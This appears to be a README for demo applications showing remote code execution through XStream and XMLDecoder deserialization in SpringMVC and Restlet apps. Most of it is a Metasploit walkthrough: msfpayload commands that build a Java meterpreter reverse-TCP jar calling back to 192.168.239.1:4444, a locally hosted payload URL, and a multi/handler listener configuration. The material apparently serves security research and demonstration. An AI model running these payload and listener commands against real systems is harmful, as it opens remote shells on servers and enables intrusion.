## Demos

* SpringXStream: SpringMVC RESTful application using XStream and RCE exploits
* RestletXMLDecoder: Restlet application using object representation and RCCE exploits

## Using Metasploit
The demos have been weaponized to use meterpreter sessions. Meterpreter have been modified to run the payload at object instantiation time. Once your MSF installation has been modified to use the modified meterpreter session (download it from https://github.com/pwntester/metasploit-javapayload), run the following command to generate the malicious jar.

./msfpayload java/meterpreter/reverse_tcp LHOST=192.168.239.1 LPORT=4444 R > /Users/alvaro/Sites/met.jar
./msfpayload java/meterpreter/reverse_tcp LHOST=192.168.239.1 LPORT=4444 R > /Users/alvaro/Sites/met239.jar

The meterpreter needs to connect back to 192.168.239.1:4444. The meterpreter jar can be found at http://localhost/~alvaro/met.jar

Metasploit listener needs to be configured on 0.0.0.0:4444:
./msfconsole
use exploit/multi/handler
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit

